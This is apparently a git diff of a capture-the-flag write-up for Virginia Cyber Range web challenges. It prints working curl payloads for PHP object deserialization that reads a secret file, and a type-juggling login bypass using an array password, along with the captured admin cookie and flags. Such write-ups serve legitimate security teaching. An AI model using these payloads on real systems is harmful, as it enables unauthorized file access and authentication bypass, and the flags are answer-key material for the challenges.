@@ -165,13 +165,13 @@ O:6:"cereal":3:{s:11:"cereal_name";s:4:"FLAG";s:13:"cereal_flavor";s:4:"blah";s:
 
 Lets build our curl command:
 ```
-curl -X POST 'https://cerealize.challenges.virginiacyberrange.net/cerealize.php' -F 'cereal="O:6:\"cereal\":3:{s:11:\"cereal_name\";s:4:\"blah\";s:13:\"cereal_flavor\";s:4:\"blah\";s:12:\"cereal_brand\";s:4:\"blah\";}"'
+curl -X POST https://cerealize.challenges.virginiacyberrange.net/cerealize.php -F 'cereal="O:6:\"cereal\":3:{s:11:\"cereal_name\";s:4:\"blah\";s:13:\"cereal_flavor\";s:4:\"blah\";s:12:\"cereal_brand\";s:4:\"blah\";}"'
 ```
 
 - `curl`: cmd
 - `-X`: type of request
 - `POST`: specify type
-- `'https..`: website to send request to
+- `https..`: website to send request to
 - `-F`: specify the next input is form-data (since $_POST doesn't see request body data)
 - `'cerea..`: the form data under the "cereal" parameter
 
@@ -179,7 +179,7 @@ curl -X POST 'https://cerealize.challenges.virginiacyberrange.net/cerealize.php'
 We can verify this works if we run it:
 ```
 ┌──(kali㉿kali)-[~]
-└─$ curl -X POST 'https://cerealize.challenges.virginiacyberrange.net/cerealize.php' -F 'cereal="O:6:\"cereal\":3:{s:11:\"cereal_name\";s:4:\"blah\";s:13:\"cereal_flavor\";s:4:\"blah\";s:12:\"cereal_brand\";s:4:\"blah\";}"'
+└─$ curl -X POST https://cerealize.challenges.virginiacyberrange.net/cerealize.php -F 'cereal="O:6:\"cereal\":3:{s:11:\"cereal_name\";s:4:\"blah\";s:13:\"cereal_flavor\";s:4:\"blah\";s:12:\"cereal_brand\";s:4:\"blah\";}"'
 ...
 
 Thanks for submitting a new cereal for our archive!You told us aboutblah; we'll see if it's in our archive! If not, we'll add it.
@@ -213,7 +213,7 @@ O:6:"cereal":3:{s:11:"cereal_name";O:21:"secret_cereal_archive":1:{s:8:"filename
 Lets see if we get the flag:
 ```
 ┌──(kali㉿kali)-[~]
-└─$ curl -X POST 'https://cerealize.challenges.virginiacyberrange.net/cerealize.php' -F 'cereal="O:6:\"cereal\":3:{s:11:\"cereal_name\";O:21:\"secret_cereal_archive\":1:{s:8:\"filename\";s:27:\"/var/www/secret_archive.txt\";}s:13:\"cereal_flavor\";s:6:\"FLAVOR\";s:12:\"cereal_brand\";s:5:\"BRAND\";}"'
+└─$ curl -X POST https://cerealize.challenges.virginiacyberrange.net/cerealize.php -F 'cereal="O:6:\"cereal\":3:{s:11:\"cereal_name\";O:21:\"secret_cereal_archive\":1:{s:8:\"filename\";s:27:\"/var/www/secret_archive.txt\";}s:13:\"cereal_flavor\";s:6:\"FLAVOR\";s:12:\"cereal_brand\";s:5:\"BRAND\";}"'
 ...
 
 Thanks for submitting a new cereal for our archive!You told us aboutflag{d0nt_d3s3r1l1z3_us3r_1nput}
@@ -254,7 +254,75 @@ Don't worry, the password is really complicated. Nobody's going to guess it.
 -->
 ```
 
-So its pretty clear that we'll need to do some type juggling on a lose comparison in the php file. 
-Answer:
+Lets use the default username of `administrator`, now all we need to do is bypass the password. Judging from the theme of the challenge and comments, we'll need to do some type juggling with the php requests.
+
+Following this [guide](https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf), you can see the flaws with PHP's loose comparisons:
+
+![loose comparisons](https://i.imgur.com/6IPJbuF.png)
+
+However, trying all of these, I couldn't get them to work. The main reason is that with this site, the request is a form-data request, meaning it stringifys all input. Meaning instead of doing the normal
 ```
+┌──(kali㉿kali)-[~]
+└─$ curl -X POST http://juliet.virginiacyberrange.net/admin.php -H "Content-Type: application/x-www-form-urlencoded" -d "username=administrator&password=pass"
+...
+Wrong password.
+```
+
+We would replace `"Content-Type: application/x-www-form-urlencoded"` with `"Content-Type: application/json"` but as said before, we know that this form only accepts form-data or x-www-form-urlencoded requests. That rules out all integer/boolean/etc type juggling attacks. Which leaves us with arrays!
+
+So when we send the request with the parameters `username=administrator&password=pass`, php sees:
+```php
+$_REQUEST["username"] = "administrator";
+$_REQUEST["password"] = "pass";
+```
+
+But when we post `username=administrator&password[]=pass`, php sees:
+```php
+$_REQUEST["username"] = "administrator";
+$_REQUEST["password"] = ["pass"];
+```
+
+And since in loose comparisons, a string is equal to an array, we can use the same trick to get the password to work.
+
+We can send the same curl POST request except with the -v tag to get returned headers like cookies:
+```
+┌──(kali㉿kali)-[~]
+└─$ curl -v -X POST http://juliet.virginiacyberrange.net/admin.php -H "Content-Type: application/x-www-form-urlencoded" -d "username=administrator&password[]=pass"
+Note: Unnecessary use of -X or --request, POST is already inferred.
+*   Trying 54.85.223.47:80...
+* Connected to juliet.virginiacyberrange.net (54.85.223.47) port 80 (#0)
+> POST /admin.php HTTP/1.1
+> Host: juliet.virginiacyberrange.net
+> User-Agent: curl/7.81.0
+> Accept: */*
+> Content-Type: application/x-www-form-urlencoded
+> Content-Length: 38
+>
+* Mark bundle as not supporting multiuse
+< HTTP/1.1 200 OK
+< Date: Wed, 27 Jul 2022 04:17:40 GMT
+< Content-Type: text/html; charset=UTF-8
+< Content-Length: 1016
+< Connection: keep-alive
+< Server: Apache/2.4.29 (Ubuntu)
+< Set-Cookie: admin_cookie=mlqAAAnjnufewo29838ncbZ; expires=Wed, 27-Jul-2022 05:17:40 GMT; Max-Age=3600
+...
+You've logged in successfully.
+```
+
+Success! We logged in successfully and we got a cookie called `admin_cookie` with the value of `mlqAAAnjnufewo29838ncbZ`. Now looking back to the login page, we see a "get the flag button", clicking that will redirect us to `http://juliet.virginiacyberrange.net/flag.php`.
+
+So lets see if we can pass in that `admin_cookie` cookie with the GET request to `/flag.php`:
+```
+┌──(kali㉿kali)-[~]
+└─$ curl http://juliet.virginiacyberrange.net/flag.php --cookie "admin_cookie=mlqAAAnjnufewo29838ncbZ"
+<html>
+<body style=background-color:#f44a41>
+flag{r34l_pr0s_juggl3_typ3s}</body>
+</html>
+```
+
+And we got the flag! Answer:
+```
+flag{r34l_pr0s_juggl3_typ3s}
 ```
